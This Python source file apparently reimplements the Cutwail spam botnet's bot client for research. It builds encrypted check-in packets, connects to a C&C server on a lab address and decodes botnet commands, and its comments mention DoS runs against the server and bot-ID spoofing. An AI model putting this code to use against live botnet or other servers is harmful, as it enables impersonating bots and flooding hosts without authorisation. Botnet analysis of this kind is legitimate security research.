# bot.py

"""
Description:

This program connects and communicates with the botnet C&C.

Modules:

    cipher          : Defines the CBC encryption/decryption functions
    utils           : Defines some utility functions
    c_types_defines : Defines ctype structures
    termcolor       : For printing out colored text, $pip install termcolor

"""

import sys
import array
import socket
import fcntl
import struct
import time

from cipher import pencrypt, pdecrypt
from utils import hexdump, get_ip_address
from c_types_defines import *
from termcolor import cprint

# Enable/Disable debug mode
DBG = False

# C&C connection IP and Port number
# Test: nc -l 8080 | hexdump -C
#HOST = "127.0.0.1"
HOST = "10.0.0.128"
PORT = 43242

# Network interface of bot
IFACE   = "vmnet8"
TIMEOUT = 3

# C&C commands
RC_SLEEP    = 1
RC_GETWORK  = 2
RC_RESTART  = 3
RC_UPDATE   = 4
RC_BID      = 5
RC_TEMPLATE = 6
RC_CONFIG   = 7
RC_MAILFROM = 8
RC_ACCOUNTS = 9

# Initialise network socket
def init_socket(iface, timeout=None):
    # Socket configurations
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((get_ip_address(iface), 0))

    if timeout:
        s.settimeout(timeout)

    # Connect
    try:
        s.connect((HOST, PORT))
    except socket.error as e:
        sys.exit(str(e))

    return s

# Generate server request
def generate_package(bid=0, bulkstate=1, dbg=False):
    # Generate bulk_info array
    bulk_info_array = ""
    for i in range(0, 2):
        bulk_info = init_bulk_info(i, bulkstate)
        bulk_info_array += buffer(bulk_info)[:]

    # Generate botbulk_info
    botbulk_info = init_botbulk_info(1, i+1)

    # Generate bot_rheader
    size = 20 + 8 * botbulk_info.logsize
    bot_rheader = init_bot_rheader(bid, size)

    # Construct data package
    data = buffer(bot_rheader)[:] \
            + pencrypt(buffer(botbulk_info)[:] + bulk_info_array, bot_rheader.size)

    # Print package content
    if dbg:
        cprint("BOT_RHEADER\n", "yellow"); print hexdump(buffer(bot_rheader)[:])
        cprint("BOTBULK_INFO\n", "yellow"); print hexdump(buffer(botbulk_info)[:])
        cprint("BULK_INFO\n", "yellow"); print hexdump(buffer(bulk_info_array)[:])
        cprint("Data Package\n", "yellow"); print hexdump(data)

    return data

# Process server response
# The print_cmd parameter is set to False during DoS attacks, to avoid
# printing out server response status unnecessarily.
def process_package(rcvmsg, rtt=0, dbg=False, print_cmd=True):
    # Interpret RC command (1-9)
    cmd = struct.unpack("i", rcvmsg[0:4])[0] # struct.unpack() returns a tuple

    if cmd in range(1,10):
        if print_cmd:
            sys.stdout.write("[+] Received (RTT: " + str(rtt * 1000) \
                + "ms, Pkg size: " + str(len(rcvmsg)) + "): ")

    if print_cmd:
        if   cmd == RC_SLEEP:
            cprint("RC_SLEEP",      "cyan")
        elif cmd == RC_GETWORK:
            cprint("RC_GETWORK",    "cyan")
        elif cmd == RC_RESTART:
            cprint("RC_RESTART",    "cyan")
        elif cmd == RC_UPDATE:
            cprint("RC_UPDATE",     "cyan")
        elif cmd == RC_BID:
            cprint("RC_BID",        "cyan")
        elif cmd == RC_TEMPLATE:
            cprint("RC_TEMPLATE",   "cyan")
        elif cmd == RC_CONFIG:
            cprint("RC_CONFIG",     "cyan")
        elif cmd == RC_MAILFROM:
            cprint("RC_MAILFROM",   "cyan")
        elif cmd == RC_ACCOUNTS:
            cprint("RC_ACCOUNTS",   "cyan")

    # Decrypt data received
    if len(rcvmsg) > 8:
        dec = pdecrypt(rcvmsg[8:], len(rcvmsg[8:]))
        if dbg:
            cprint("Decrypted:\n" + hexdump(dec), "yellow")

    # Command actions
    if cmd == RC_BID:
        # Extract the BID from the decrypted data
        bid = struct.unpack("i", dec[0:4])[0] 

        # Extract sign.timer from the decrypted data
        timer = struct.unpack("i", dec[8:12])[0]

        if dbg:
            cprint("[+] Assigned BID: " + str(bid) \
                    + ", Timer: " + str(timer), "green")

        return bid

# Communicate with the botnet C&C server
def communicate(s, dbg=False, print_cmd=True, timeout=0):
    # Initialise recv buffer
    buf = ""

    # Initial BID (modify to spoof BID)
    bid = 0

    # Send initial server request
    if dbg:
        cprint("\n[*] Sending server request to " + HOST + ": " \
                + str(PORT) + " (hexdump below)", "green")

    data = generate_package(bid, dbg=dbg)
    start = time.time() # Start timer
    s.sendall(data)

    if dbg:
        cprint("[+] Sent! Now waiting to receive data...", "green")

    # Listen for server response
    while True:
        try:
            # Try receiving data
            rcvmsg = s.recv(4096)

            # Check whether connection is closed
            if rcvmsg == "":
                break

            # Got some data! Store data in buffer (for later use)
            buf += rcvmsg

        except socket.timeout:
            # Timed out on receiving data:
            end = time.time() # Stop timer
            rtt = end - start - timeout # Calculate server response time

            # Process contents of recv buffer (if not empty)
            if buf:
                tmp = process_package(buf, rtt, dbg=dbg, print_cmd=print_cmd)

                # Received RC_BID: update BID field
                if tmp:
                    bid = tmp

                time.sleep(1)

                # Generate server request
                if dbg:
                    cprint("\n[*] Sending server request...", "green")
                data = generate_package(bid, dbg=dbg)

                # Restart timer and send data
                start = time.time()
                s.sendall(data)

                # Clear recv buffer
                buf = ""
                if dbg:
                    cprint("\n[*] Listening for incoming data...\t(press Ctrl+C to quit)" \
                        , "green")

        except Exception as e:
            cprint("[-] "+ str(e), "red")
            break

def main():
    print "Cutwail Bot Clone v5.2"

    # Initialise network socket
    s = init_socket(IFACE, TIMEOUT)

    # Start communication with the C&C server
    communicate(s, dbg=DBG, timeout=TIMEOUT)

    # Close socket
    s.close()

if __name__ == "__main__":
    main()

